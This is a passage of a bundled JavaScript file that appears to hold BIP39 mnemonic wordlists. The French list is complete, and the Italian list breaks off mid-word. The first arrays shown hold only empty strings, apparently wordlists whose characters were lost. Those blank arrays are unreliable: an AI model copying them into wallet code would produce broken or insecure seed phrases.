","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","",""]')
  , require$$3 = JSON.parse('["","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","",""]')
  , require$$4$1 = JSON.parse('["abaisser","abandon","abdiquer","abeille","abolir","aborder","aboutir","aboyer","abrasif","abreuver","abriter","abroger","abrupt","absence","absolu","absurde","abusif","abyssal","academie","acajou","acarien","accabler","accepter","acclamer","accolade","accroche","accuser","acerbe","achat","acheter","aciduler","acier","acompte","acquerir","acronyme","acteur","actif","actuel","adepte","adequat","adhesif","adjectif","adjuger","admettre","admirer","adopter","adorer","adoucir","adresse","adroit","adulte","adverbe","aerer","aeronef","affaire","affecter","affiche","affreux","affubler","agacer","agencer","agile","agiter","agrafer","agreable","agrume","aider","aiguille","ailier","aimable","aisance","ajouter","ajuster","alarmer","alchimie","alerte","algebre","algue","aliener","aliment","alleger","alliage","allouer","allumer","alourdir","alpaga","altesse","alveole","amateur","ambigu","ambre","amenager","amertume","amidon","amiral","amorcer","amour","amovible","amphibie","ampleur","amusant","analyse","anaphore","anarchie","anatomie","ancien","aneantir","angle","angoisse","anguleux","animal","annexer","annonce","annuel","anodin","anomalie","anonyme","anormal","antenne","antidote","anxieux","apaiser","aperitif","aplanir","apologie","appareil","appeler","apporter","appuyer","aquarium","aqueduc","arbitre","arbuste","ardeur","ardoise","argent","arlequin","armature","armement","armoire","armure","arpenter","arracher","arriver","arroser","arsenic","arteriel","article","aspect","asphalte","aspirer","assaut","asservir","assiette","associer","assurer","asticot","astre","astuce","atelier","atome","atrium","atroce","attaque","attentif","attirer","attraper","aubaine","auberge","audace","audible","augurer","aurore","automne","autruche","avaler","avancer","avarice","avenir","averse","aveugle","aviateur","avide","avion","aviser","avoine","avouer","avril","axial","axiome","badge","bafouer","bagage","baguette","baignade","balancer","balcon","baleine","balisage","bambin","bancaire","bandage","banlieue","banniere","banquier","barbier","baril","baron","barque","barrage","bassin","bastion","bataille","bateau","batterie","baudrier","bavarder","belette","belier","belote","benefice","berceau","berger","berline","bermuda","besace","besogne","betail","beurre","biberon","bicycle","bidule","bijou","bilan","bilingue","billard","binaire","biologie","biopsie","biotype","biscuit","bison","bistouri","bitume","bizarre","blafard","blague","blanchir","blessant","blinder","blond","bloquer","blouson","bobard","bobine","boire","boiser","bolide","bonbon","bondir","bonheur","bonifier","bonus","bordure","borne","botte","boucle","boueux","bougie","boulon","bouquin","bourse","boussole","boutique","boxeur","branche","brasier","brave","brebis","breche","breuvage","bricoler","brigade","brillant","brioche","brique","brochure","broder","bronzer","brousse","broyeur","brume","brusque","brutal","bruyant","buffle","buisson","bulletin","bureau","burin","bustier","butiner","butoir","buvable","buvette","cabanon","cabine","cachette","cadeau","cadre","cafeine","caillou","caisson","calculer","calepin","calibre","calmer","calomnie","calvaire","camarade","camera","camion","campagne","canal","caneton","canon","cantine","canular","capable","caporal","caprice","capsule","capter","capuche","carabine","carbone","caresser","caribou","carnage","carotte","carreau","carton","cascade","casier","casque","cassure","causer","caution","cavalier","caverne","caviar","cedille","ceinture","celeste","cellule","cendrier","censurer","central","cercle","cerebral","cerise","cerner","cerveau","cesser","chagrin","chaise","chaleur","chambre","chance","chapitre","charbon","chasseur","chaton","chausson","chavirer","chemise","chenille","chequier","chercher","cheval","chien","chiffre","chignon","chimere","chiot","chlorure","chocolat","choisir","chose","chouette","chrome","chute","cigare","cigogne","cimenter","cinema","cintrer","circuler","cirer","cirque","citerne","citoyen","citron","civil","clairon","clameur","claquer","classe","clavier","client","cligner","climat","clivage","cloche","clonage","cloporte","cobalt","cobra","cocasse","cocotier","coder","codifier","coffre","cogner","cohesion","coiffer","coincer","colere","colibri","colline","colmater","colonel","combat","comedie","commande","compact","concert","conduire","confier","congeler","connoter","consonne","contact","convexe","copain","copie","corail","corbeau","cordage","corniche","corpus","correct","cortege","cosmique","costume","coton","coude","coupure","courage","couteau","couvrir","coyote","crabe","crainte","cravate","crayon","creature","crediter","cremeux","creuser","crevette","cribler","crier","cristal","critere","croire","croquer","crotale","crucial","cruel","crypter","cubique","cueillir","cuillere","cuisine","cuivre","culminer","cultiver","cumuler","cupide","curatif","curseur","cyanure","cycle","cylindre","cynique","daigner","damier","danger","danseur","dauphin","debattre","debiter","deborder","debrider","debutant","decaler","decembre","dechirer","decider","declarer","decorer","decrire","decupler","dedale","deductif","deesse","defensif","defiler","defrayer","degager","degivrer","deglutir","degrafer","dejeuner","delice","deloger","demander","demeurer","demolir","denicher","denouer","dentelle","denuder","depart","depenser","dephaser","deplacer","deposer","deranger","derober","desastre","descente","desert","designer","desobeir","dessiner","destrier","detacher","detester","detourer","detresse","devancer","devenir","deviner","devoir","diable","dialogue","diamant","dicter","differer","digerer","digital","digne","diluer","dimanche","diminuer","dioxyde","directif","diriger","discuter","disposer","dissiper","distance","divertir","diviser","docile","docteur","dogme","doigt","domaine","domicile","dompter","donateur","donjon","donner","dopamine","dortoir","dorure","dosage","doseur","dossier","dotation","douanier","double","douceur","douter","doyen","dragon","draper","dresser","dribbler","droiture","duperie","duplexe","durable","durcir","dynastie","eblouir","ecarter","echarpe","echelle","eclairer","eclipse","eclore","ecluse","ecole","economie","ecorce","ecouter","ecraser","ecremer","ecrivain","ecrou","ecume","ecureuil","edifier","eduquer","effacer","effectif","effigie","effort","effrayer","effusion","egaliser","egarer","ejecter","elaborer","elargir","electron","elegant","elephant","eleve","eligible","elitisme","eloge","elucider","eluder","emballer","embellir","embryon","emeraude","emission","emmener","emotion","emouvoir","empereur","employer","emporter","emprise","emulsion","encadrer","enchere","enclave","encoche","endiguer","endosser","endroit","enduire","energie","enfance","enfermer","enfouir","engager","engin","englober","enigme","enjamber","enjeu","enlever","ennemi","ennuyeux","enrichir","enrobage","enseigne","entasser","entendre","entier","entourer","entraver","enumerer","envahir","enviable","envoyer","enzyme","eolien","epaissir","epargne","epatant","epaule","epicerie","epidemie","epier","epilogue","epine","episode","epitaphe","epoque","epreuve","eprouver","epuisant","equerre","equipe","eriger","erosion","erreur","eruption","escalier","espadon","espece","espiegle","espoir","esprit","esquiver","essayer","essence","essieu","essorer","estime","estomac","estrade","etagere","etaler","etanche","etatique","eteindre","etendoir","eternel","ethanol","ethique","ethnie","etirer","etoffer","etoile","etonnant","etourdir","etrange","etroit","etude","euphorie","evaluer","evasion","eventail","evidence","eviter","evolutif","evoquer","exact","exagerer","exaucer","exceller","excitant","exclusif","excuse","executer","exemple","exercer","exhaler","exhorter","exigence","exiler","exister","exotique","expedier","explorer","exposer","exprimer","exquis","extensif","extraire","exulter","fable","fabuleux","facette","facile","facture","faiblir","falaise","fameux","famille","farceur","farfelu","farine","farouche","fasciner","fatal","fatigue","faucon","fautif","faveur","favori","febrile","feconder","federer","felin","femme","femur","fendoir","feodal","fermer","feroce","ferveur","festival","feuille","feutre","fevrier","fiasco","ficeler","fictif","fidele","figure","filature","filetage","filiere","filleul","filmer","filou","filtrer","financer","finir","fiole","firme","fissure","fixer","flairer","flamme","flasque","flatteur","fleau","fleche","fleur","flexion","flocon","flore","fluctuer","fluide","fluvial","folie","fonderie","fongible","fontaine","forcer","forgeron","formuler","fortune","fossile","foudre","fougere","fouiller","foulure","fourmi","fragile","fraise","franchir","frapper","frayeur","fregate","freiner","frelon","fremir","frenesie","frere","friable","friction","frisson","frivole","froid","fromage","frontal","frotter","fruit","fugitif","fuite","fureur","furieux","furtif","fusion","futur","gagner","galaxie","galerie","gambader","garantir","gardien","garnir","garrigue","gazelle","gazon","geant","gelatine","gelule","gendarme","general","genie","genou","gentil","geologie","geometre","geranium","germe","gestuel","geyser","gibier","gicler","girafe","givre","glace","glaive","glisser","globe","gloire","glorieux","golfeur","gomme","gonfler","gorge","gorille","goudron","gouffre","goulot","goupille","gourmand","goutte","graduel","graffiti","graine","grand","grappin","gratuit","gravir","grenat","griffure","griller","grimper","grogner","gronder","grotte","groupe","gruger","grutier","gruyere","guepard","guerrier","guide","guimauve","guitare","gustatif","gymnaste","gyrostat","habitude","hachoir","halte","hameau","hangar","hanneton","haricot","harmonie","harpon","hasard","helium","hematome","herbe","herisson","hermine","heron","hesiter","heureux","hiberner","hibou","hilarant","histoire","hiver","homard","hommage","homogene","honneur","honorer","honteux","horde","horizon","horloge","hormone","horrible","houleux","housse","hublot","huileux","humain","humble","humide","humour","hurler","hydromel","hygiene","hymne","hypnose","idylle","ignorer","iguane","illicite","illusion","image","imbiber","imiter","immense","immobile","immuable","impact","imperial","implorer","imposer","imprimer","imputer","incarner","incendie","incident","incliner","incolore","indexer","indice","inductif","inedit","ineptie","inexact","infini","infliger","informer","infusion","ingerer","inhaler","inhiber","injecter","injure","innocent","inoculer","inonder","inscrire","insecte","insigne","insolite","inspirer","instinct","insulter","intact","intense","intime","intrigue","intuitif","inutile","invasion","inventer","inviter","invoquer","ironique","irradier","irreel","irriter","isoler","ivoire","ivresse","jaguar","jaillir","jambe","janvier","jardin","jauger","jaune","javelot","jetable","jeton","jeudi","jeunesse","joindre","joncher","jongler","joueur","jouissif","journal","jovial","joyau","joyeux","jubiler","jugement","junior","jupon","juriste","justice","juteux","juvenile","kayak","kimono","kiosque","label","labial","labourer","lacerer","lactose","lagune","laine","laisser","laitier","lambeau","lamelle","lampe","lanceur","langage","lanterne","lapin","largeur","larme","laurier","lavabo","lavoir","lecture","legal","leger","legume","lessive","lettre","levier","lexique","lezard","liasse","liberer","libre","licence","licorne","liege","lievre","ligature","ligoter","ligue","limer","limite","limonade","limpide","lineaire","lingot","lionceau","liquide","lisiere","lister","lithium","litige","littoral","livreur","logique","lointain","loisir","lombric","loterie","louer","lourd","loutre","louve","loyal","lubie","lucide","lucratif","lueur","lugubre","luisant","lumiere","lunaire","lundi","luron","lutter","luxueux","machine","magasin","magenta","magique","maigre","maillon","maintien","mairie","maison","majorer","malaxer","malefice","malheur","malice","mallette","mammouth","mandater","maniable","manquant","manteau","manuel","marathon","marbre","marchand","mardi","maritime","marqueur","marron","marteler","mascotte","massif","materiel","matiere","matraque","maudire","maussade","mauve","maximal","mechant","meconnu","medaille","medecin","mediter","meduse","meilleur","melange","melodie","membre","memoire","menacer","mener","menhir","mensonge","mentor","mercredi","merite","merle","messager","mesure","metal","meteore","methode","metier","meuble","miauler","microbe","miette","mignon","migrer","milieu","million","mimique","mince","mineral","minimal","minorer","minute","miracle","miroiter","missile","mixte","mobile","moderne","moelleux","mondial","moniteur","monnaie","monotone","monstre","montagne","monument","moqueur","morceau","morsure","mortier","moteur","motif","mouche","moufle","moulin","mousson","mouton","mouvant","multiple","munition","muraille","murene","murmure","muscle","museum","musicien","mutation","muter","mutuel","myriade","myrtille","mystere","mythique","nageur","nappe","narquois","narrer","natation","nation","nature","naufrage","nautique","navire","nebuleux","nectar","nefaste","negation","negliger","negocier","neige","nerveux","nettoyer","neurone","neutron","neveu","niche","nickel","nitrate","niveau","noble","nocif","nocturne","noirceur","noisette","nomade","nombreux","nommer","normatif","notable","notifier","notoire","nourrir","nouveau","novateur","novembre","novice","nuage","nuancer","nuire","nuisible","numero","nuptial","nuque","nutritif","obeir","objectif","obliger","obscur","observer","obstacle","obtenir","obturer","occasion","occuper","ocean","octobre","octroyer","octupler","oculaire","odeur","odorant","offenser","officier","offrir","ogive","oiseau","oisillon","olfactif","olivier","ombrage","omettre","onctueux","onduler","onereux","onirique","opale","opaque","operer","opinion","opportun","opprimer","opter","optique","orageux","orange","orbite","ordonner","oreille","organe","orgueil","orifice","ornement","orque","ortie","osciller","osmose","ossature","otarie","ouragan","ourson","outil","outrager","ouvrage","ovation","oxyde","oxygene","ozone","paisible","palace","palmares","palourde","palper","panache","panda","pangolin","paniquer","panneau","panorama","pantalon","papaye","papier","papoter","papyrus","paradoxe","parcelle","paresse","parfumer","parler","parole","parrain","parsemer","partager","parure","parvenir","passion","pasteque","paternel","patience","patron","pavillon","pavoiser","payer","paysage","peigne","peintre","pelage","pelican","pelle","pelouse","peluche","pendule","penetrer","penible","pensif","penurie","pepite","peplum","perdrix","perforer","periode","permuter","perplexe","persil","perte","peser","petale","petit","petrir","peuple","pharaon","phobie","phoque","photon","phrase","physique","piano","pictural","piece","pierre","pieuvre","pilote","pinceau","pipette","piquer","pirogue","piscine","piston","pivoter","pixel","pizza","placard","plafond","plaisir","planer","plaque","plastron","plateau","pleurer","plexus","pliage","plomb","plonger","pluie","plumage","pochette","poesie","poete","pointe","poirier","poisson","poivre","polaire","policier","pollen","polygone","pommade","pompier","ponctuel","ponderer","poney","portique","position","posseder","posture","potager","poteau","potion","pouce","poulain","poumon","pourpre","poussin","pouvoir","prairie","pratique","precieux","predire","prefixe","prelude","prenom","presence","pretexte","prevoir","primitif","prince","prison","priver","probleme","proceder","prodige","profond","progres","proie","projeter","prologue","promener","propre","prospere","proteger","prouesse","proverbe","prudence","pruneau","psychose","public","puceron","puiser","pulpe","pulsar","punaise","punitif","pupitre","purifier","puzzle","pyramide","quasar","querelle","question","quietude","quitter","quotient","racine","raconter","radieux","ragondin","raideur","raisin","ralentir","rallonge","ramasser","rapide","rasage","ratisser","ravager","ravin","rayonner","reactif","reagir","realiser","reanimer","recevoir","reciter","reclamer","recolter","recruter","reculer","recycler","rediger","redouter","refaire","reflexe","reformer","refrain","refuge","regalien","region","reglage","regulier","reiterer","rejeter","rejouer","relatif","relever","relief","remarque","remede","remise","remonter","remplir","remuer","renard","renfort","renifler","renoncer","rentrer","renvoi","replier","reporter","reprise","reptile","requin","reserve","resineux","resoudre","respect","rester","resultat","retablir","retenir","reticule","retomber","retracer","reunion","reussir","revanche","revivre","revolte","revulsif","richesse","rideau","rieur","rigide","rigoler","rincer","riposter","risible","risque","rituel","rival","riviere","rocheux","romance","rompre","ronce","rondin","roseau","rosier","rotatif","rotor","rotule","rouge","rouille","rouleau","routine","royaume","ruban","rubis","ruche","ruelle","rugueux","ruiner","ruisseau","ruser","rustique","rythme","sabler","saboter","sabre","sacoche","safari","sagesse","saisir","salade","salive","salon","saluer","samedi","sanction","sanglier","sarcasme","sardine","saturer","saugrenu","saumon","sauter","sauvage","savant","savonner","scalpel","scandale","scelerat","scenario","sceptre","schema","science","scinder","score","scrutin","sculpter","seance","secable","secher","secouer","secreter","sedatif","seduire","seigneur","sejour","selectif","semaine","sembler","semence","seminal","senateur","sensible","sentence","separer","sequence","serein","sergent","serieux","serrure","serum","service","sesame","sevir","sevrage","sextuple","sideral","siecle","sieger","siffler","sigle","signal","silence","silicium","simple","sincere","sinistre","siphon","sirop","sismique","situer","skier","social","socle","sodium","soigneux","soldat","soleil","solitude","soluble","sombre","sommeil","somnoler","sonde","songeur","sonnette","sonore","sorcier","sortir","sosie","sottise","soucieux","soudure","souffle","soulever","soupape","source","soutirer","souvenir","spacieux","spatial","special","sphere","spiral","stable","station","sternum","stimulus","stipuler","strict","studieux","stupeur","styliste","sublime","substrat","subtil","subvenir","succes","sucre","suffixe","suggerer","suiveur","sulfate","superbe","supplier","surface","suricate","surmener","surprise","sursaut","survie","suspect","syllabe","symbole","symetrie","synapse","syntaxe","systeme","tabac","tablier","tactile","tailler","talent","talisman","talonner","tambour","tamiser","tangible","tapis","taquiner","tarder","tarif","tartine","tasse","tatami","tatouage","taupe","taureau","taxer","temoin","temporel","tenaille","tendre","teneur","tenir","tension","terminer","terne","terrible","tetine","texte","theme","theorie","therapie","thorax","tibia","tiede","timide","tirelire","tiroir","tissu","titane","titre","tituber","toboggan","tolerant","tomate","tonique","tonneau","toponyme","torche","tordre","tornade","torpille","torrent","torse","tortue","totem","toucher","tournage","tousser","toxine","traction","trafic","tragique","trahir","train","trancher","travail","trefle","tremper","tresor","treuil","triage","tribunal","tricoter","trilogie","triomphe","tripler","triturer","trivial","trombone","tronc","tropical","troupeau","tuile","tulipe","tumulte","tunnel","turbine","tuteur","tutoyer","tuyau","tympan","typhon","typique","tyran","ubuesque","ultime","ultrason","unanime","unifier","union","unique","unitaire","univers","uranium","urbain","urticant","usage","usine","usuel","usure","utile","utopie","vacarme","vaccin","vagabond","vague","vaillant","vaincre","vaisseau","valable","valise","vallon","valve","vampire","vanille","vapeur","varier","vaseux","vassal","vaste","vecteur","vedette","vegetal","vehicule","veinard","veloce","vendredi","venerer","venger","venimeux","ventouse","verdure","verin","vernir","verrou","verser","vertu","veston","veteran","vetuste","vexant","vexer","viaduc","viande","victoire","vidange","video","vignette","vigueur","vilain","village","vinaigre","violon","vipere","virement","virtuose","virus","visage","viseur","vision","visqueux","visuel","vital","vitesse","viticole","vitrine","vivace","vivipare","vocation","voguer","voile","voisin","voiture","volaille","volcan","voltiger","volume","vorace","vortex","voter","vouloir","voyage","voyelle","wagon","xenon","yacht","zebre","zenith","zeste","zoologie"]')
  , require$$5$1 = JSON.parse('["abaco","abbaglio","abbinato","abete","abisso","abolire","abrasivo","abrogato","accadere","accenno","accusato","acetone","achille","acido","acqua","acre","acrilico","acrobata","acuto","adagio","addebito","addome","adeguato","aderire","adipe","adottare","adulare","affabile","affetto","affisso","affranto","aforisma","afoso","africano","agave","agente","agevole","aggancio","agire","agitare","agonismo","agricolo","agrumeto","aguzzo","alabarda","alato","albatro","alberato","albo","albume","alce","alcolico","alettone","alfa","algebra","aliante","alibi","alimento","allagato","allegro","allievo","allodola","allusivo","almeno","alogeno","alpaca","alpestre","altalena","alterno","alticcio","altrove","alunno","alveolo","alzare","amalgama","amanita","amarena","ambito","ambrato","ameba","america","ametista","amico","ammasso","ammenda","ammirare","ammonito","amore","ampio","ampliare","amuleto","anacardo","anagrafe","analista","anarchia","anatra","anca","ancella","ancora","andare","andrea","anello","angelo","angolare","angusto","anima","annegare","annidato","anno","annuncio","anonimo","anticipo","anzi","apatico","apertura","apode","apparire","appetito","appoggio","approdo","appunto","aprile","arabica","arachide","aragosta","araldica","arancio","aratura","arazzo","arbitro","archivio","ardito","arenile","argento","argine","arguto","aria","armonia","arnese","arredato","arringa","arrosto","arsenico","arso","artefice","arzillo","asciutto","ascolto","asepsi","asettico","asfalto","asino","asola","aspirato","aspro","assaggio","asse","assoluto","assurdo","asta","astenuto","astice","astratto","atavico","ateismo","atomico","atono","attesa","attivare","attorno","attrito","attuale","ausilio","austria","autista","autonomo","autunno","avanzato","avere","avvenire","avviso","avvolgere","azione","azoto","azzimo","azzurro","babele","baccano","bacino","baco","badessa","badilata","bagnato","baita","balcone","baldo","balena","ballata","balzano","bambino","bandire","baraonda","barbaro","barca","baritono","barlume","barocco","basilico","basso","batosta","battuto","baule","bava","bavosa","becco","beffa","belgio","belva","benda","benevole","benigno","benzina","bere","berlina","beta","bibita","bici","bidone","bifido","biga","bilancia","bimbo","binocolo","biologo","bipede","bipolare","birbante","birra","biscotto","bisesto","bisnonno","bisonte","bisturi","bizzarro","blando","blatta","bollito","bonifico","bordo","bosco","botanico","bottino","bozzolo","braccio","bradipo","brama","branca","bravura","bretella","brevetto","brezza","briglia","brillante","brindare","broccolo","brodo","bronzina","brullo","bruno","bubbone","buca","budino","buffone","buio","bulbo","buono","burlone","burrasca","bussola","busta","cadetto","caduco","calamaro","calcolo","calesse","calibro","calmo","caloria","cambusa","camerata","camicia","cammino","camola","campale","canapa","candela","cane","canino","canotto","cantina","capace","capello","capitolo","capogiro","cappero","capra","capsula","carapace","carcassa","cardo","carisma","carovana","carretto","cartolina","casaccio","cascata","caserma","caso","cassone","castello","casuale","catasta","catena","catrame","cauto","cavillo","cedibile","cedrata","cefalo","celebre","cellulare","cena","cenone","centesimo","ceramica","cercare","certo","cerume","cervello","cesoia","cespo","ceto","chela","chiaro","chicca","chiedere","chimera","china","chirurgo","chitarra","ciao","ciclismo","cifrare","cigno","cilindro","ciottolo","circa","cirrosi","citrico","cittadino","ciuffo","civetta","civile","classico","clinica","cloro","cocco","codardo","codice","coerente","cognome","collare","colmato","colore","colposo","coltivato","colza","coma","cometa","commando","comodo","computer","comune","conciso","condurre","conferma","congelare","coniuge","connesso","conoscere","consumo","continuo","convegno","coperto","copione","coppia","copricapo","corazza","cordata","coricato","cornice","corolla","corpo","corredo","corsia","cortese","cosmico","costante","cottura","covato","cratere","cravatta","creato","credere","cremoso","crescita","creta","criceto","crinale","crisi","critico","croce","cronaca","crostata","cruciale","crusca","cucire","cuculo","cugino","cullato","cupola","curatore","cursore","curvo","cuscino","custode","dado","daino","dalmata","damerino","daniela","dannoso","danzare","datato","davanti","davvero","debutto","decennio","deciso","declino","decollo","decreto","dedicato","definito","deforme","degno","delegare","delfino","delirio","delta","demenza","denotato","dentro","deposito","derapata","derivare","deroga","descritto","deserto","desiderio","desumere","detersivo","devoto","diametro","dicembre","diedro","difeso","diffuso","digerire","digitale","diluvio","dinamico","dinnanzi","dipinto","diploma","dipolo","diradare","dire","dirotto","dirupo","disagio","discreto","disfare","disgelo","disposto","distanza","disumano","dito","divano","divelto","dividere","divorato","doblone","docente","doganale","dogma","dolce","domato","domenica","dominare","dondolo","dono","dormire","dote","dottore","dovuto","dozzina","drago","druido","dubbio","dubitare","ducale","duna","duomo","duplice","duraturo","ebano","eccesso","ecco","eclissi","economia","edera","edicola","edile","editoria","educare","egemonia","egli","egoismo","egregio","elaborato","elargire","elegante","elencato","eletto","elevare","elfico","elica","elmo","elsa","eluso","emanato","emblema","emesso","emiro","emotivo","emozione","empirico","emulo","endemico","enduro","energia","enfasi","enoteca","entrare","enzima","epatite","epilogo","episodio","epocale","eppure","equatore","erario","erba","erboso","erede","eremita","erigere","ermetico","eroe","erosivo","errante","esagono","esame","esanime","esaudire","esca","esempio","esercito","esibito","esigente","esistere","esito","esofago","esortato","esoso","espanso","espresso","essenza","esso","esteso","estimare","estonia","estroso","esultare","etilico","etnico","etrusco","etto","euclideo","europa","evaso","evidenza","evitato","evoluto","evviva","fabbrica","faccenda","fachiro","falco","famiglia","fanale","fanfara","fango","fantasma","fare","farfalla","farinoso","farmaco","fascia","fastoso","fasullo","faticare","fato","favoloso","febbre","fecola","fede","fegato","felpa","feltro","femmina","fendere","fenomeno","fermento","ferro","fertile","fessura","festivo","fetta","feudo","fiaba","fiducia","fifa","figurato","filo","finanza","finestra","finire","fiore","fiscale","fisico","fiume","flacone","flamenco","flebo","flemma","florido","fluente","fluoro","fobico","focaccia","focoso","foderato","foglio","folata","folclore","folgore","fondente","fonetico","fonia","fontana","forbito","forchetta","foresta","formica","fornaio","foro","fortezza","forzare","fosfato","fosso","fracasso","frana","frassino","fratello","freccetta","frenata","fresco","frigo","frollino","fronde","frugale","frutta","fucilata","fucsia","fuggente","fulmine","fulvo","fumante","fumetto","fumoso","fune","funzione","fuoco","furbo","furgone","furore","fuso","futile","gabbiano","gaffe","galateo","gallina","galoppo","gambero","gamma","garanzia","garbo","garofano","garzone","gasdotto","gasolio","gastrico","gatto","gaudio","gazebo","gazzella","geco","gelatina","gelso","gemello","gemmato","gene","genitore","gennaio","genotipo","gergo","ghepardo","ghiaccio","ghisa","giallo","gilda","ginepro","giocare","gioiello","giorno","giove","girato","girone","gittata","giudizio","giurato","giusto","globulo","glutine","gnomo","gobba","golf","gomito","gommone","gonfio","gonna","governo","gracile","grado","grafico","grammo","grande","grattare","gravoso","grazia","greca","gregge","grifone","grigio","grinza","grotta","gruppo","guadagno","guaio","guanto","guardare","gufo","guidare","ibernato","icona","identico","idillio","idolo","idra","idrico","idrogeno","igiene","ignaro","ignorato","ilare","illeso","illogico","illudere","imballo","imbevuto","imbocco","imbuto","immane","immerso","immolato","impacco","impeto","impiego","importo","impronta","inalare","inarcare","inattivo","incanto","incendio","inchino","incisivo","incluso","incontro","incrocio","incubo","indagine","india","indole","inedito","infatti","infilare","inflitto","ingaggio","ingegno","inglese","ingordo","ingrosso","innesco","inodore","inoltrare","inondato","insano","insetto","insieme","insonnia","insulina","intasato","intero","intonaco","intuito","inumidire","invalido","invece","invito","iperbole","ipnotico","ipotesi","ippica","iride","irlanda","ironico","irrigato","irrorare","isolato","isotopo","isterico","istituto","istrice","italia","iterare","labbro","labirinto","lacca","lacerato","lacrima","lacuna","laddove","lago","lampo","lancetta","lanterna","lardoso","larga","laringe","lastra","latenza","latino","lattuga","lavagna","lavoro","legale","leggero","lembo","lentezza","lenza","leone","lepre","lesivo","lessato","lesto","letterale","leva","levigato","libero","lido","lievito","lilla","limatura","limitare","limpido","lineare","lingua","liquido","lira","lirica","lisca","lite","litigio","livrea","locanda","lode","logica","lombare","londra","longevo","loquace","lorenzo","loto","lotteria","luce","lucidato","lumaca","luminoso","lungo","lupo","luppolo","lusinga","lusso","lutto","macabro","macchina","macero","macinato","madama","magico","maglia","magnete","magro","maiolica","m